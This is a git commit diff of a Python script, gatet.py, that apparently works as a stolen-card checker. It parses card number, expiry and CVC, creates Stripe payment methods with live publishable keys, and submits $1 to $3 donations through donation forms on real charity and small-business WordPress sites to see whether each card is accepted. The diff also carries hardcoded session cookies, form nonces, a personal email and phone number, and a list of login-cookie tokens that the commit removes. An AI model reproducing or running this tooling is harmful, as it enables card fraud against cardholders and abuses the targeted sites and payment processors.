62914a8dafc9121f738452bd0efe5bba35f28c6f
minhtetza <128377466+minhtetza@users.noreply.github.com>
2024-10-28 21:33:18 +0630

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,10 +1,3 @@
-import requests
-import re
-import random
-import time
-import string
-import base64
-from bs4 import BeautifulSoup
 import requests,re
 def Tele(ccx):
 	import requests
@@ -17,63 +10,85 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 
+
 	headers = {
-			'authority': 'api.stripe.com',
-			'accept': 'application/json',
-			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-			'content-type': 'application/x-www-form-urlencoded',
-			'origin': 'https://js.stripe.com',
-			'referer': 'https://js.stripe.com/',
-			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'empty',
-			'sec-fetch-mode': 'cors',
-			'sec-fetch-site': 'same-site',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51DMipVKeLHvIBrT6uZAz9LxYzOMOThN05PGot0yoYRIOZNp15FLoaEoWAMJpapXjk4KRouXSLi0rQFEVB6uT6UqC00j5WzCylK'
+	data = f'type=card&billing_details[name]=Hy&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][line2]=Hhh&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade&pasted_fields=number&payment_user_agent=stripe.js%2F803162f903%3B+stripe-js-v3%2F803162f903%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=53559&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
 
+
 	cookies = {
-			'__stripe_mid': 'e5b01e8c-dacf-4f97-b04e-4aca065681857ee92e',
-			'__stripe_sid': 'a94de27d-e021-4b13-8690-30e4fa15c00c581cca',
+            '_ga': 'GA1.1.1027315439.1730043864',
+            'charitable_session': 'aef110cc4f9105e7ed853b595426a622||86400||82800',
+            '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
+            '__stripe_sid': '3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade',
+            '_ga_M3WG7TPY0P': 'GS1.1.1730043864.1.1.1730044001.0.0.0',
+            '_ga_9S894YGECP': 'GS1.1.1730043863.1.1.1730044004.0.0.0',
 	}
 
 	headers = {
-			'authority': 'tasmanianinquirer.com.au',
-			'accept': '*/*',
-			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
-			'origin': 'https://tasmanianinquirer.com.au',
-			'referer': 'https://tasmanianinquirer.com.au/contribute/',
-			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'empty',
-			'sec-fetch-mode': 'cors',
-			'sec-fetch-site': 'same-origin',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-			'x-requested-with': 'XMLHttpRequest',
+            'authority': 'needhelped.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '_ga=GA1.1.1027315439.1730043864; charitable_session=aef110cc4f9105e7ed853b595426a622||86400||82800; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; __stripe_sid=3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade; _ga_M3WG7TPY0P=GS1.1.1730043864.1.1.1730044001.0.0.0; _ga_9S894YGECP=GS1.1.1730043863.1.1.1730044004.0.0.0',
+            'origin': 'https://needhelped.com',
+            'referer': 'https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
 	}
 
-	params = {
-			't': '1728134582304',
-	}
 
 	data = {
-			'data': '__fluent_form_embded_post_id=3500&_fluentform_3_fluentformnonce=f254f6607b&_wp_http_referer=%2Fcontribute%2F&payment_input_1=5&email=rein48287%40gmail.com&names_1%5Bfirst_name%5D=Rein&names_1%5Blast_name%5D=Rein&payment_method=stripe&checkbox%5B%5D=Check%20to%20receive%20a%20free%20email%20alert%20when%20we%20publish%20a%20new%20story&__entry_intermediate_hash=372032a6a1cf4f2f7168c0435348c0a3&__stripe_payment_method_id='+str(pm)+'',
-			'action': 'fluentform_submit',
-			'form_id': '3',
+            'charitable_form_id': '671e606084fc2',
+            '671e606084fc2': '',
+            '_charitable_donation_nonce': '7879bdccbb',
+            '_wp_http_referer': '/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
+            'campaign_id': '1163',
+            'description': 'Christmas: Poor Family Need Help for Mother Teresa’s charity',
+            'ID': '0',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Chit',
+            'last_name': 'Nge',
+            'email': 'saimyataungcr8@gmail.com',
+            'address': 'New York',
+            'address_2': 'Hhh',
+            'city': 'New York ',
+            'state': 'New York',
+            'postcode': '10080',
+            'country': 'US',
+            'phone': '15025659429',
+            'gateway': 'stripe',
+            'stripe_payment_method': pm,
+            'action': 'make_donation',
+            'form_action': 'make_donation',
 	}
 	
 	r2 = requests.post(
-			'https://tasmanianinquirer.com.au/wp-admin/admin-ajax.php',
-			params=params,
+			'https://needhelped.com/wp-admin/admin-ajax.php',
 			cookies=cookies,
 			headers=headers,
 			data=data,
@@ -83,7 +98,8 @@ def Tele(ccx):
 	except:
 		return 'success' or 'Thank You'
 	return ii
-			
+
+import requests,re
 def Tele2(ccx):
 	import requests
 	ccx=ccx.strip()
@@ -93,24 +109,8 @@ def Tele2(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
-	with open('fileb3.txt', 'r') as file:
-		first_line = file.readline()
-	while True:
-		lines='''zkbzmssh%7C1722163826%7CPYyJVGful9oiz9Fk2qffCmmrLkPFHj6pjCToHoyt8r1%7Ceb9935d8bc113a5acd9c193064033918787622ca95782d6317955699be2082b0
-'hdjshshsh%7C1722164162%7CTP3afdym0X81iDDxRTbRkBWLDdAKgqEKwqx6GYim365%7C424cfcf6eb45d32f11893eb98004603b447a77cee129c990e95867665537d75d
-bsbsjdhhdj%7C1722164292%7CAnd5Gmo2UVNQz7IFiuuOHbcWFUoVJBk7DQtsjQS27Oa%7C6e9883df5374751c0cdc9383a751fcb80b31dfacc9e4747bbf08883e4986a7c7
-jdhshsh%7C1722164426%7CQkqnUBtPMRYcYpcvKhriZedlcVJsl24RrNRohG9rVRM%7Cbb8a8b162fd95263262ae98ada998ab6063eb46e075d944fda37cffee93b343a
-'''
-		lines = lines.strip().split('\n')
-		random_line_number = random.randint(0, len(lines) - 1)
-		big = lines[random_line_number]
-		if big == first_line:
-			pass
-		else:
-			break
-	with open('fileb3.txt', 'w') as file:
-		file.write(big)
-	import requests
+	r = requests.session()
+
 
 	headers = {
 			'authority': 'api.stripe.com',
@@ -128,58 +128,54 @@ jdhshsh%7C1722164426%7CQkqnUBtPMRYcYpcvKhriZedlcVJsl24RrNRohG9rVRM%7Cbb8a8b162fd
 			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NJgOXCjU8lO8MWc81K66yGhcm9C0UPHTGgfypyAMPmRU79JIeCDD5mPWBGOU2v8hcYshCsaVmnqNzl50NQEe4p100CxLWdRv1'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Q9zOoP8CnXsumqaMSligBEuHCOTbbw06EdZ8p0Yvr64Pgi7jDwI8IzHSZZWrsj0atvhQfrCDFuYWslVhgqJWSyH006EBFpwtZ'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
 
-	import requests
 
 	cookies = {
-			'__stripe_mid': 'd995f54d-9538-4878-a87b-12c43a6bbf36ea2fbc',
-			'__stripe_sid': '72b76125-964d-40a9-9c86-1b5fa32027eb550fb6',
+            '__stripe_mid': '3d85359e-8d75-414e-9b44-1b5c4412a86152dadf',
+            '__stripe_sid': 'e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
 	}
 
 	headers = {
-			'authority': 'golf316.org',
-			'accept': '*/*',
-			'accept-language': 'en-US,en;q=0.9',
-			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-			# 'cookie': '_gcl_au=1.1.1367202926.1717785226; _ga=GA1.1.893384611.1717785226; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; __stripe_mid=3a0199b6-5c49-4a71-902d-5f067e943a8e8b6c91; lp_session_guest=g-6667f5cca6926; twk_idm_key=xdzosJCoUNJs2yO4wkzym; __stripe_sid=7640bd74-93e1-4970-9509-07359c7280685d8ce8; TawkConnectionTime=0; _ga_1MRCZYKWF0=GS1.1.1718151395.11.1.1718151493.0.0.0; _ga_05M43KE6K7=GS1.1.1718151396.27.1.1718151493.0.0.0',
-			'origin': 'https://golf316.org',
-			'referer': 'https://golf316.org/donations/',
-			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'empty',
-			'sec-fetch-mode': 'cors',
-			'sec-fetch-site': 'same-origin',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-			'x-requested-with': 'XMLHttpRequest',
+            'authority': 'g-pg.com.au',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            # 'cookie': '__stripe_mid=3d85359e-8d75-414e-9b44-1b5c4412a86152dadf; __stripe_sid=e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
+            'origin': 'https://g-pg.com.au',
+            'referer': 'https://g-pg.com.au/welcome/repeat-script-requests',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
 	}
 
 	params = {
-			't': '1728016959531',
+			't': '1729922956202',
 	}
 
 	data = {
-			'data': '__fluent_form_embded_post_id=2161&_fluentform_7_fluentformnonce=3309ed33dc&_wp_http_referer=%2Fdonations%2F&names%5Bfirst_name%5D=Sai&names%5Blast_name%5D=Myat&email=saimyataungcr8%40gmail.com&payment_input=Other&custom-payment-amount=3&payment_method=stripe&__entry_intermediate_hash=ceb9d66af62f3c39b9f0b3c405664044&__stripe_payment_method_id='+str(pm)+'',
+            'data': '__fluent_form_embded_post_id=1138&_fluentform_5_fluentformnonce=a397b837fc&_wp_http_referer=%2Fwelcome%2Frepeat-script-requests&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&datetime=21%2F10%2F2000&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&input_text=Tgg&address_1%5Baddress_line_1%5D=New%20York&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&numeric-field=1502565942&email=saimyataungcr8%40gmail.com&dropdown=Dr%20Jo%20Centra&message=Cc&datetime_2=03%2F10%2F2024&message_1=Cc&datetime_1=31%2F10%2F2024&payment_input=Standard%20Script%20Request&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
             'action': 'fluentform_submit',
-            'form_id': '7',
+            'form_id': '5',
 	}
 	
 	r2 = requests.post(
-			'https://golf316.org/wp-admin/admin-ajax.php',
+			'https://g-pg.com.au/wp-admin/admin-ajax.php',
 			params=params,
 			cookies=cookies,
 			headers=headers,
 			data=data,
-	).json()
-	try:
-		ii=r2['errors']
-	except:
-		return 'success' or 'Thank You'
-	return ii
-			
-			
-		
+	)
+	return (r2.json())
+
+
+	
+	
